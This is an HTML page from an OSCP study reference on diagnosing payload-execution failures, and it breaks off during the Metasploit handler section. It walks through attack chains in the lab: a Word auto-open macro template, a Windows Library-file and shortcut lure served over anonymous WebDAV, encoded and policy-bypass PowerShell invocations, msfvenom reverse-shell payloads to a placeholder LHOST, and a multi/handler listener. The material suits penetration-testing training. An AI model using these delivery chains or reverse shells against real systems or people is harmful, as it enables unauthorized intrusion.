@@ -1,0 +1,710 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="generator" content="Astro v7.2.0"><meta name="description" content="Commands, variants, interpretation and next actions for Payload Execution Obstacles."><meta name="theme-color" content="#121414"><link rel="canonical" href="https://armaanleg3nd.github.io/tools/oscp/reference/04-shells-transfers-credentials/06-payload-execution-obstacles/"><link rel="icon" href="/favicon.svg" type="image/svg+xml"><meta property="og:title" content="Payload Execution Obstacles | OSCP reference | Armaan"><meta property="og:description" content="Commands, variants, interpretation and next actions for Payload Execution Obstacles."><meta property="og:type" content="website"><meta property="og:url" content="https://armaanleg3nd.github.io/tools/oscp/reference/04-shells-transfers-credentials/06-payload-execution-obstacles/"><title>Payload Execution Obstacles | OSCP reference | Armaan</title><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="swap"><script type="module" src="/_assets/ClientRouter.astro_astro_type_script_index_0_lang.xc6nT38P.js"></script><link rel="stylesheet" href="/_assets/BaseLayout.C8rLAhpp.css"><link rel="stylesheet" href="/_assets/ToolLayout.Bh0Ez8ox.css"><style>.full-reference{max-width:1420px;color:var(--text);margin:auto;padding:2rem clamp(1rem,4vw,4rem) 5rem}.full-reference a{color:var(--cyan-soft)}.full-reference h1{margin:1.25rem 0;font-size:clamp(1.7rem,3vw,2.5rem);line-height:1.2}.full-reference p{color:var(--muted);max-width:80ch;line-height:1.8}.reference-find{gap:.6rem;max-width:44rem;margin:1.5rem 0;font-size:.85rem;display:grid}.reference-find input{border:1px solid var(--line-strong);background:var(--surface-low);color:var(--text);border-radius:3px;padding:.8rem}.reference-index{grid-template-columns:repeat(2,minmax(0,1fr));gap:2rem;display:grid}.reference-index section{min-width:0}.reference-index h2{text-transform:capitalize;border-bottom:1px solid var(--line);padding-bottom:.7rem;font-size:1.2rem}.reference-index h3{margin:1.3rem 0 .5rem;font-size:1rem}.reference-index ul{padding-left:1.2rem;font-size:.84rem;line-height:1.9}.reference-index .level-3{color:var(--muted);margin-left:1rem;font-size:.76rem}.reference-index [hidden]{display:none}.reference-reading{grid-template-columns:240px minmax(0,1fr);gap:2.5rem;display:grid}.reference-reading nav{top:calc(var(--header-height) + 1rem);max-height:calc(100dvh - var(--header-height) - 2rem);border-right:1px solid var(--line);align-self:start;padding:1rem;font-size:.76rem;position:sticky;overflow:auto}.reference-reading nav ul{padding:0;list-style:none}.reference-reading nav li{margin:.7rem 0;line-height:1.5}.reference-reading nav .level-3{padding-left:1rem;font-size:.7rem}.reference-prose{min-width:0;line-height:1.85}.reference-prose :is(h1,h2,h3,h4){scroll-margin-top:calc(var(--header-height) + 1.5rem);margin:2rem 0 1rem;line-height:1.35}.reference-prose h2{border-top:1px solid var(--line);padding-top:1.5rem;font-size:1.35rem}.reference-prose h3{font-size:1.05rem}.reference-prose pre{border:1px solid var(--line);background:var(--surface-low);max-width:100%;font:.8rem/1.75 var(--mono);border-radius:3px;padding:2.5rem 1rem 1rem;position:relative;overflow:auto}.reference-prose [data-reference-copy]{border:1px solid var(--line);color:var(--cyan-soft);font:.65rem var(--mono);cursor:pointer;background:0 0;padding:.2rem .5rem;position:absolute;top:.4rem;right:.5rem}.reference-prose code{overflow-wrap:anywhere;font-size:.85em}.reference-prose pre code{overflow-wrap:normal;font-size:inherit}.reference-prose blockquote{border-left:2px solid var(--cyan);color:var(--muted);margin:1.25rem 0;padding-left:1rem}.reference-prose table{border-collapse:collapse;max-width:100%;font-size:.8rem;display:block;overflow:auto}.reference-prose :is(td,th){border:1px solid var(--line);text-align:left;padding:.6rem}.reference-prose img{max-width:100%;height:auto}.reference-prose details{border-top:1px solid var(--line);padding:.8rem 0}.reference-prose summary{cursor:pointer;color:var(--cyan-soft)}@media (width<=850px){.reference-index,.reference-reading{grid-template-columns:1fr}.reference-reading nav{border:1px solid var(--line);max-height:18rem;position:static}.full-reference{padding-top:1rem}}
+</style><style>[data-astro-transition-scope="astro-nfpogox7-1"] { view-transition-name: page-content; }@layer astro { ::view-transition-old(page-content) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }::view-transition-new(page-content) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back]::view-transition-old(page-content) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back]::view-transition-new(page-content) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-nfpogox7-1"],
+			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-nfpogox7-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-nfpogox7-1"],
+			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-nfpogox7-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back][data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-nfpogox7-1"],
+			[data-astro-transition=back][data-astro-transition-fallback="old"][data-astro-transition-scope="astro-nfpogox7-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back][data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-nfpogox7-1"],
+			[data-astro-transition=back][data-astro-transition-fallback="new"][data-astro-transition-scope="astro-nfpogox7-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }</style></head><body><a class="skip-link" href="#main-content">Skip to content</a><header class="site-header" data-astro-cid-wpvy4v7s><nav class="site-nav" aria-label="Primary navigation" data-astro-cid-wpvy4v7s><a class="brand" href="/" aria-label="leg3nd home" data-astro-cid-wpvy4v7s><span data-astro-cid-wpvy4v7s>leg3nd</span><small data-astro-cid-wpvy4v7s>Projects &amp; tools</small></a><button class="nav-toggle" type="button" aria-expanded="false" aria-controls="nav-links" data-astro-cid-wpvy4v7s><span data-astro-cid-wpvy4v7s>MENU</span><span class="nav-toggle__glyph" aria-hidden="true" data-astro-cid-wpvy4v7s>[+]</span></button><div class="nav-links" id="nav-links" data-astro-cid-wpvy4v7s><a href="/" data-astro-cid-wpvy4v7s><span class="nav-index" data-astro-cid-wpvy4v7s>01</span>Home</a><a href="/projects/" data-astro-cid-wpvy4v7s><span class="nav-index" data-astro-cid-wpvy4v7s>02</span>Projects</a><a href="/tools/" class="active" aria-current="page" data-astro-cid-wpvy4v7s><span class="nav-index" data-astro-cid-wpvy4v7s>03</span>Tools</a></div><div class="system-state" aria-label="Timezone" data-astro-cid-wpvy4v7s>GMT+8</div></nav></header><script type="module">var e=()=>{let e=document.querySelector(`.nav-toggle`),t=document.querySelector(`.nav-links`);if(!e||!t||e.dataset.bound===`true`)return;e.dataset.bound=`true`;let n=()=>{e.setAttribute(`aria-expanded`,`false`),t.dataset.open=`false`;let n=e.querySelector(`.nav-toggle__glyph`);n&&(n.textContent=`[+]`)};e.addEventListener(`click`,()=>{let n=e.getAttribute(`aria-expanded`)===`true`;e.setAttribute(`aria-expanded`,String(!n)),t.dataset.open=String(!n);let r=e.querySelector(`.nav-toggle__glyph`);r&&(r.textContent=n?`[+]`:`[-]`)}),t.addEventListener(`click`,e=>{e.target.closest(`a`)&&n()}),e.closest(`nav`)?.addEventListener(`keydown`,t=>{t.key===`Escape`&&(n(),e.focus())})};document.addEventListener(`astro:page-load`,e),e();</script><div data-astro-transition-scope="astro-nfpogox7-1" id="main-content"><div class="tools-surface"><main class="full-reference"><p><a href="/tools/oscp/reference/">← Complete task index</a> · <a href="/tools/oscp/">Workspace</a></p><div class="reference-reading"><nav aria-label="On this page"><strong>On this page</strong><ul><li class="level-2"><a href="#1-preserve-the-execution-chain">1. Preserve the execution chain</a></li><li class="level-2"><a href="#2-fast-diagnostic-order">2. Fast diagnostic order</a></li><li class="level-2"><a href="#3-client-side-attacks-are-gated-chains">3. Client-side attacks are gated chains</a></li><li class="level-3"><a href="#31-office-macro-chain">3.1 Office macro chain</a></li><li class="level-3"><a href="#32-windows-library-file-plus-shortcut">3.2 Windows Library file plus shortcut</a></li><li class="level-2"><a href="#4-match-artifact-to-its-consumer">4. Match artifact to its consumer</a></li><li class="level-3"><a href="#41-linux-checks">4.1 Linux checks</a></li><li class="level-3"><a href="#42-windows-checks">4.2 Windows checks</a></li><li class="level-2"><a href="#5-parser-command-line-and-length-failures">5. Parser, command-line and length failures</a></li><li class="level-2"><a href="#6-powershell-control-layers">6. PowerShell control layers</a></li><li class="level-2"><a href="#7-interpret-control-evidence">7. Interpret control evidence</a></li><li class="level-2"><a href="#8-generate-only-after-selecting-the-context">8. Generate only after selecting the context</a></li><li class="level-2"><a href="#9-multihandler-and-session-lifecycle">9. multi/handler and session lifecycle</a></li><li class="level-2"><a href="#10-metasploit-module-workflow-and-exam-boundary">10. Metasploit module workflow and exam boundary</a></li><li class="level-2"><a href="#11-worked-diagnostic-paths">11. Worked diagnostic paths</a></li><li class="level-3"><a href="#a-document-delivered-no-callback">A. Document delivered, no callback</a></li><li class="level-3"><a href="#b-executable-disappears-after-transfer">B. Executable disappears after transfer</a></li><li class="level-3"><a href="#c-powershell-says-scripts-are-disabled">C. PowerShell says scripts are disabled</a></li><li class="level-3"><a href="#d-connection-reaches-netcat-but-there-is-no-shell">D. Connection reaches Netcat but there is no shell</a></li><li class="level-3"><a href="#e-binary-exists-but-returns-not-found-on-linux">E. Binary exists but returns “not found” on Linux</a></li><li class="level-3"><a href="#f-metasploit-module-reports-completion-no-session">F. Metasploit module reports completion, no session</a></li><li class="level-2"><a href="#12-evidence-and-cleanup">12. Evidence and cleanup</a></li><li class="level-2"><a href="#tooling-for-this-section">Tooling for this section</a></li><li class="level-2"><a href="#sources">Sources</a></li></ul></nav><article class="reference-prose"><h1 id="payload-execution-obstacles">Payload Execution Obstacles</h1>
+<p><a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/reference/04-shells-transfers-credentials/README.md">← Stage index</a> | <a href="/tools/oscp/reference/04-shells-transfers-credentials/02-shells-and-payloads/">Shells and payloads</a> | <a href="/tools/oscp/reference/04-shells-transfers-credentials/01-file-transfer/">File transfer</a> | <a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/cheatsheets/payload-execution.md">Payload-execution cheatsheet</a> | <a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/notes/Attack_Strategy_Map.md">Strategy map</a> | Study methods: <a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/notes/methods/execution.md">Resolve payload execution obstacles</a></p>
+<blockquote>
+<p><strong>Goal:</strong> determine the first failed boundary between delivery and a usable session, then change only the condition responsible. Commands are generic authorized-lab references. Client-side delivery requires explicit scope and the intended exercise user interaction.</p>
+</blockquote>
+<h2 id="1-preserve-the-execution-chain">1. Preserve the execution chain</h2>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-text">artifact/request
+→ delivered to intended consumer
+→ required user/trigger action
+→ parser/interpreter/loader
+→ process or bounded side effect
+→ network connection
+→ handler protocol
+→ usable session
+</code></pre>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Boundary</th><th>Decisive evidence</th><th>Does not prove</th></tr></thead><tbody><tr><td>Delivery</td><td>Expected bytes, request, document or shortcut arrives intact</td><td>It was opened or parsed</td></tr><tr><td>Trigger</td><td>Intended user/service/parser consumed it</td><td>Child process started</td></tr><tr><td>Execution</td><td>Harmless marker, process or command output</td><td>Callback route works</td></tr><tr><td>Connection</td><td>Expected peer reaches listener</td><td>Payload and handler agree</td></tr><tr><td>Session</td><td>Commands return; host and identity verified</td><td>Stability or privilege</td></tr></tbody></table>
+<p>Do not replace the artifact, payload, listener and route simultaneously. Record the last confirmed boundary and test the next one.</p>
+<h2 id="2-fast-diagnostic-order">2. Fast diagnostic order</h2>
+<ol>
+<li>Reproduce a harmless direct command in the exact vulnerable or user context.</li>
+<li>Confirm file/request integrity, final path and consumer.</li>
+<li>Identify every parser, interpreter and loader.</li>
+<li>Match target OS, process architecture, artifact format and runtime dependencies.</li>
+<li>Verify permissions, working directory, execution policy and application-control evidence.</li>
+<li>Start the correct listener/handler and prove its bind.</li>
+<li>Prove the target-to-listener route separately.</li>
+<li>Inspect concrete antimalware, application-control and process-failure evidence.</li>
+<li>Repair session I/O only after a connection exists.</li>
+</ol>
+<p>If step 1 fails, this is not yet a payload problem. Return to the exploit, input parser or execution primitive.</p>
+<h2 id="3-client-side-attacks-are-gated-chains">3. Client-side attacks are gated chains</h2>
+<p>Client-side access adds two prerequisites that service exploitation does not normally have:</p>
+<ul>
+<li>the artifact must reach the intended user and application;</li>
+<li>the user or application must perform the action that reaches the execution sink.</li>
+</ul>
+<p>Before choosing a document or shortcut, establish the target OS, installed application/version, delivery route, expected security zone, required interaction, target egress and callback route. A generic file that depends on absent software is not a viable attack.</p>
+<h3 id="31-office-macro-chain">3.1 Office macro chain</h3>
+<p>Use a macro-enabled format such as <code>.docm</code> or a legacy <code>.doc</code>; <code>.docx</code> does not persist embedded VBA macros by itself. Store the macro in the document, not only the global template. A minimal harmless execution proof is:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-vb">Sub AutoOpen()
+    RunProof
+End Sub
+
+Sub Document_Open()
+    RunProof
+End Sub
+
+Sub RunProof()
+    CreateObject("WScript.Shell").Run _
+        "cmd.exe /c whoami > %TEMP%\oscp-marker.txt", 0, True
+End Sub
+</code></pre>
+<p><code>AutoOpen</code> and <code>Document_Open</code> cover distinct Word opening paths. Replace the proof command only after the document, trigger and execution context are confirmed.</p>
+<p>Modern Office commonly blocks VBA macros in files carrying Mark of the Web rather than offering a universal one-click enable path. Relevant gates include:</p>
+<ul>
+<li>file format actually supports the macro;</li>
+<li>macro is stored in the delivered document;</li>
+<li>MOTW/Zone Identifier and security zone;</li>
+<li>Protected View and Trust Center settings;</li>
+<li>signed publisher or Trusted Location decisions;</li>
+<li>organization GPO that the user cannot override;</li>
+<li>user opened the document and performed the required permitted action;</li>
+<li>Office launched the expected child process;</li>
+<li>the child command survived VBA, CMD and PowerShell quoting;</li>
+<li>delivery and callback network paths both work.</li>
+</ul>
+<p>Inspect a file's zone without changing it:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-powershell">Get-Item -LiteralPath 'C:\PATH\FILE.docm' -Stream *
+Get-Content -LiteralPath 'C:\PATH\FILE.docm' -Stream Zone.Identifier
+</code></pre>
+<p><code>ZoneId=3</code> represents the Internet zone. Absence of the stream does not prove that macro policy permits execution, and removing MOTW does not override every policy.</p>
+<h3 id="32-windows-library-file-plus-shortcut">3.2 Windows Library file plus shortcut</h3>
+<p>A <code>.Library-ms</code> file is an XML library description that can present a remote location in Explorer. The PEN-200 attack pattern is two-stage:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-text">delivered .Library-ms
+→ user opens library
+→ Explorer reaches WebDAV location
+→ user opens .lnk
+→ shortcut launches chosen command
+→ optional download/callback
+</code></pre>
+<p>If WsgiDAV is already installed, publish a dedicated authorized-lab directory:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">mkdir -p webdav
+wsgidav --host=0.0.0.0 --port=80 \
+  --root=./webdav --auth=anonymous
+</code></pre>
+<blockquote>
+<p>Anonymous mode exposes the selected directory. Bind only to the required lab interface when possible, place no sensitive files there and stop the server after the exercise.
+Port 80 is the reliable baseline for a plain-HTTP Windows WebDAV location. Use another port only after confirming the target WebClient accepts that URL form and the route permits it.</p>
+</blockquote>
+<p>Original library template using placeholders:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-xml">&#x3C;?xml version="1.0" encoding="UTF-8"?>
+&#x3C;libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+  &#x3C;name>@windows.storage.dll,-34582&#x3C;/name>
+  &#x3C;version>1&#x3C;/version>
+  &#x3C;isLibraryPinned>true&#x3C;/isLibraryPinned>
+  &#x3C;iconReference>imageres.dll,-1002&#x3C;/iconReference>
+  &#x3C;templateInfo>
+    &#x3C;folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}&#x3C;/folderType>
+  &#x3C;/templateInfo>
+  &#x3C;searchConnectorDescriptionList>
+    &#x3C;searchConnectorDescription>
+      &#x3C;isDefaultSaveLocation>true&#x3C;/isDefaultSaveLocation>
+      &#x3C;isSupported>false&#x3C;/isSupported>
+      &#x3C;simpleLocation>
+        &#x3C;url>http://LHOST/&#x3C;/url>
+      &#x3C;/simpleLocation>
+    &#x3C;/searchConnectorDescription>
+  &#x3C;/searchConnectorDescriptionList>
+&#x3C;/libraryDescription>
+</code></pre>
+<p>Save it with a <code>.Library-ms</code> extension. Windows may add a serialized location after opening it; retain a clean source copy and inspect the final artifact before delivery.</p>
+<p>Create a shortcut on a controlled Windows preparation host:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-powershell">$shortcutPath = 'C:\PATH\webdav\ACTION.lnk'
+$shell = New-Object -ComObject WScript.Shell
+$shortcut = $shell.CreateShortcut($shortcutPath)
+$shortcut.TargetPath = "$env:SystemRoot\System32\cmd.exe"
+$shortcut.Arguments = '/c whoami > %TEMP%\oscp-marker.txt'
+$shortcut.WorkingDirectory = $env:TEMP
+$shortcut.IconLocation = "$env:SystemRoot\System32\imageres.dll,11"
+$shortcut.Save()
+</code></pre>
+<p>Only after the harmless marker works, substitute a command compatible with the target and the separately proven callback route. Diagnose this chain at three independent network points:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-text">Explorer → WebDAV
+shortcut command → optional payload/download server
+executed payload → listener/handler
+</code></pre>
+<p>Failure cues:</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Observation</th><th>Next boundary</th></tr></thead><tbody><tr><td>Library opens empty</td><td>WebDAV bind, reachability, WebClient/policy, modified library serialization</td></tr><tr><td>WebDAV receives nothing</td><td>Artifact not opened, URL/port wrong, client route or WebDAV blocked</td></tr><tr><td>Directory appears; shortcut never runs</td><td>Required second user action absent or shortcut blocked</td></tr><tr><td>Marker works; download absent</td><td>Command quoting, DNS and payload-server route</td></tr><tr><td>Download occurs; no execution</td><td>Format, permissions, policy, quarantine or dependency</td></tr><tr><td>Execution proven; no callback</td><td>Listener, route, payload/handler compatibility</td></tr></tbody></table>
+<h2 id="4-match-artifact-to-its-consumer">4. Match artifact to its consumer</h2>
+<p>The file extension is not the execution contract. Record all of these:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-text">target OS and build
+target process architecture
+artifact format
+loader/interpreter
+execution identity and integrity
+working directory and PATH
+required runtime/libraries
+arguments and quoting
+network direction
+handler protocol
+</code></pre>
+<h3 id="41-linux-checks">4.1 Linux checks</h3>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">uname -a
+uname -m
+file PAYLOAD
+readelf -h PAYLOAD | sed -n '1,25p'
+ldd PAYLOAD
+ls -l PAYLOAD
+findmnt -T /PATH/TO/PAYLOAD
+head -n 1 SCRIPT
+</code></pre>
+<p>Common interpretations:</p>
+<ul>
+<li><code>Exec format error</code>: wrong format/architecture or invalid interpreter line;</li>
+<li><code>Permission denied</code>: missing execute permission, inaccessible parent directory, <code>noexec</code>, policy or identity issue;</li>
+<li><code>No such file or directory</code> when the file exists: missing dynamic loader or broken shebang interpreter;</li>
+<li>missing shared object: runtime library mismatch;</li>
+<li><code>^M</code> in a shebang: CRLF line endings changed the interpreter path;</li>
+<li>works interactively but not through cron/service: environment, working directory, shell, identity or route differs.</li>
+</ul>
+<h3 id="42-windows-checks">4.2 Windows checks</h3>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-powershell">Get-CimInstance Win32_OperatingSystem |
+  Select-Object Caption,Version,BuildNumber,OSArchitecture
+
+[Environment]::Is64BitOperatingSystem
+[Environment]::Is64BitProcess
+$env:PROCESSOR_ARCHITECTURE
+Get-AuthenticodeSignature -FilePath 'C:\PATH\PAYLOAD.exe'
+</code></pre>
+<p>Keep OS architecture and consumer-process architecture separate. A 64-bit OS can run a 32-bit process under WOW64; injected code and DLLs must match the process they enter. A normal executable is not necessarily a service executable, DLL, MSI or script:</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Consumer</th><th>Required property / common failure</th></tr></thead><tbody><tr><td>Direct process creation</td><td>Compatible PE/ELF/script and dependencies</td></tr><tr><td>Windows service</td><td>Service-compatible entry/control behavior; error 1053 may follow execution of a non-service program</td></tr><tr><td>DLL loader/hijack</td><td>Correct bitness, expected exports and dependency behavior</td></tr><tr><td><code>msiexec</code></td><td>Valid MSI package, not an EXE renamed <code>.msi</code></td></tr><tr><td>PowerShell</td><td>Valid syntax, edition/runtime compatibility and applicable policy/control state</td></tr><tr><td>Existing memory-corruption PoC</td><td>Documented architecture, space, bad characters and exit behavior</td></tr></tbody></table>
+<h2 id="5-parser-command-line-and-length-failures">5. Parser, command-line and length failures</h2>
+<p>Write the real chain:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-text">document/shortcut or HTTP/SQL/template input
+→ application parser
+→ VBA/WScript/application runtime
+→ cmd.exe /c, /bin/sh -c or PowerShell
+→ final command/payload
+</code></pre>
+<p>Start with a short marker at every layer. Check:</p>
+<ul>
+<li>quote ownership at each layer;</li>
+<li>expansion of <code>%VAR%</code>, <code>$VAR</code> and PowerShell variables;</li>
+<li>metacharacters such as <code>&#x26;</code>, <code>|</code>, <code>&#x3C;</code>, <code>></code>, <code>;</code>, backticks and parentheses;</li>
+<li>URL/JSON/XML/Base64 decode count;</li>
+<li>command-line, VBA-string, request-field or exploit-buffer length;</li>
+<li>current directory and relative paths.</li>
+</ul>
+<p>PowerShell encoded-command preparation:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-powershell">$command = 'COMMAND'
+$bytes = [Text.Encoding]::Unicode.GetBytes($command)
+[Convert]::ToBase64String($bytes)
+</code></pre>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">powershell.exe -NoProfile -NonInteractive -EncodedCommand BASE64_UTF16LE
+</code></pre>
+<p><code>-EncodedCommand</code> uses UTF-16LE. It solves some transport/quoting problems; it is not encryption and does not establish antimalware evasion.</p>
+<h2 id="6-powershell-control-layers">6. PowerShell control layers</h2>
+<p>Do not merge these different controls:</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Control</th><th>What it changes</th><th>Useful evidence</th></tr></thead><tbody><tr><td>Execution policy</td><td>Conditions for loading/running scripts</td><td><code>Get-ExecutionPolicy -List</code> and exact error</td></tr><tr><td>Language mode</td><td>Available PowerShell language features</td><td><code>$ExecutionContext.SessionState.LanguageMode</code></td></tr><tr><td>AMSI</td><td>Submits supported script/content to antimalware</td><td>Explicit block/error plus Defender/PowerShell events</td></tr><tr><td>AppLocker/WDAC</td><td>Application/script allow policy</td><td>Effective policy and application-control events</td></tr><tr><td>Defender/other AV</td><td>File, memory, behavior and network decisions</td><td>Status, detection history, quarantine/events</td></tr><tr><td>Permissions</td><td>File/process/service/token rights</td><td>Access-denied result under named identity</td></tr></tbody></table>
+<p>Read-only checks:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-powershell">Get-ExecutionPolicy -List
+$ExecutionContext.SessionState.LanguageMode
+
+Get-MpComputerStatus |
+  Select-Object AntivirusEnabled,RealTimeProtectionEnabled,
+    BehaviorMonitorEnabled,IoavProtectionEnabled,AntivirusSignatureVersion
+
+Get-MpThreatDetection |
+  Select-Object InitialDetectionTime,ThreatID,ActionSuccess,Resources
+
+Get-AppLockerPolicy -Effective -Xml
+
+Get-WinEvent -LogName 'Microsoft-Windows-Windows Defender/Operational' `
+  -MaxEvents 50 -ErrorAction SilentlyContinue |
+  Select-Object TimeCreated,Id,LevelDisplayName,Message
+
+Get-WinEvent -LogName 'Microsoft-Windows-AppLocker/EXE and DLL' `
+  -MaxEvents 50 -ErrorAction SilentlyContinue |
+  Select-Object TimeCreated,Id,Message
+
+Get-WinEvent -LogName 'Microsoft-Windows-AppLocker/MSI and Script' `
+  -MaxEvents 50 -ErrorAction SilentlyContinue |
+  Select-Object TimeCreated,Id,Message
+</code></pre>
+<p>Cmdlets, logs and fields vary by edition, installed modules, permissions and control product. Missing output is inconclusive.</p>
+<p>Execution policy is defense in depth, not a Windows security boundary. A process-scoped policy setting may change script-loading behavior when GPO does not override it:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\PATH\SCRIPT.ps1
+</code></pre>
+<p>This does not disable AMSI, application control, antimalware, permissions or network controls. Do not change persistent machine/user policy merely to test a payload.</p>
+<h2 id="7-interpret-control-evidence">7. Interpret control evidence</h2>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Observation</th><th>Most useful next action</th></tr></thead><tbody><tr><td>Transferred hash differs</td><td>Repair transfer/encoding before execution</td></tr><tr><td>File arrives then vanishes</td><td>Inspect quarantine/detection events and resource path</td></tr><tr><td>File remains; process creation denied</td><td>Inspect AppLocker/WDAC, permissions and parent process</td></tr><tr><td>Script-loading policy error</td><td>Inspect scope/precedence; use an authorized process-only invocation if applicable</td></tr><tr><td>Explicit AMSI/content block</td><td>Treat content/control as confirmed; encoding alone is not a supported conclusion</td></tr><tr><td>Process starts then exits</td><td>Capture exit/error, dependency and architecture evidence</td></tr><tr><td>Process remains; no connection</td><td>Test target egress, LHOST and listener</td></tr><tr><td>TCP handshake then close</td><td>Handler/payload mismatch, stage failure, crash or control interruption</td></tr></tbody></table>
+<p>Modern protection can inspect files, scripts after decoding, process memory, behavior and network activity. Therefore:</p>
+<ul>
+<li>changing a filename does not imply a new payload;</li>
+<li>Base64 does not imply concealment from AMSI;</li>
+<li>an in-memory technique is not automatically invisible;</li>
+<li>an encoder is primarily useful for transport/bad-character constraints, not guaranteed AV bypass;</li>
+<li>a clean third-party scanner result does not prove execution on the target and may disclose a private sample.</li>
+</ul>
+<p>Prefer the least complex route already supported by evidence: a direct command, native interpreter, authenticated management service or simple command shell may meet the objective without a custom binary. Deep shellcode development, process-injection implementation and generalized AV-bypass recipes are outside this speedrun.</p>
+<h2 id="8-generate-only-after-selecting-the-context">8. Generate only after selecting the context</h2>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">msfvenom -l payloads | grep -E 'linux|windows' | grep -E 'x64|x86'
+msfvenom --list formats
+msfvenom -p PAYLOAD_NAME --list-options
+</code></pre>
+<p>Baseline stageless command shells:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">msfvenom -p linux/x64/shell_reverse_tcp \
+  LHOST=LHOST LPORT=LPORT \
+  -f elf -o shell.elf
+
+msfvenom -p windows/x64/shell_reverse_tcp \
+  LHOST=LHOST LPORT=LPORT \
+  -f exe -o shell.exe
+
+file shell.elf shell.exe
+sha256sum shell.elf shell.exe
+</code></pre>
+<p>Existing reviewed PoC with documented byte restrictions:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">msfvenom -p PAYLOAD_NAME \
+  LHOST=LHOST LPORT=LPORT \
+  EXITFUNC=thread \
+  -f FORMAT -v VARIABLE \
+  -b 'BAD_CHARACTERS' -s MAX_SPACE
+</code></pre>
+<p>Use <code>EXITFUNC</code> only when the exploit/consumer requires that termination behavior. Never invent bad characters or size limits.</p>
+<p>Staging distinction:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-text">windows/x64/shell_reverse_tcp  single/stageless
+windows/x64/shell/reverse_tcp  staged
+</code></pre>
+<p>A staged payload first connects and asks its handler for the larger stage. A raw Netcat listener cannot supply that protocol.</p>
+<h2 id="9-multihandler-and-session-lifecycle">9. multi/handler and session lifecycle</h2>
+<p>Matching handler:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-text">msfconsole -q
+use exploit/multi/handler
+set PAYLOAD PAYLOAD_NAME
+set LHOST LHOST
+set LPORT LPORT
+set ExitOnSession false
+show options
+run -j
+</code></pre>
+<p>Manage the resulting job/session deliberately:</p>
